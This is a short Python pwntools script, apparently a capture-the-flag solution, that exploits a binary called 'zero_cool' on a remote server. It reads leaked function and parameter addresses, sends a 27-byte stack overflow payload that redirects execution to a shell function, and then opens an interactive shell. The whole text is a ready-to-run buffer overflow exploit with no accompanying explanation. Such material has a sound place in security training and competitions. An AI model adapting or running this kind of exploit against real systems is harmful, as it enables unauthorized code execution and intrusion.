#!/usr/bin/python3

from pwn import *

context.arch = 'i386'

elf = ELF('./zero_cool')
r = remote('0xa.is', 31338)

r.recvuntil('Username: ')
r.sendline('debug')

offset = 27

shell_func = r.recvline().decode('utf-8').split(': ')[1]
shell_func_param = r.recvline().decode('utf-8').split(': ')[1]

shell_func_addr = int(shell_func, 16)
shell_func_param_addr = int(shell_func_param, 16)

payload = [
        b"A"*offset,
        p32(shell_func_addr),
        b"A"*4,
        p32(shell_func_param_addr)
]

payload = b"".join(payload)
r.sendline(payload)
r.interactive()
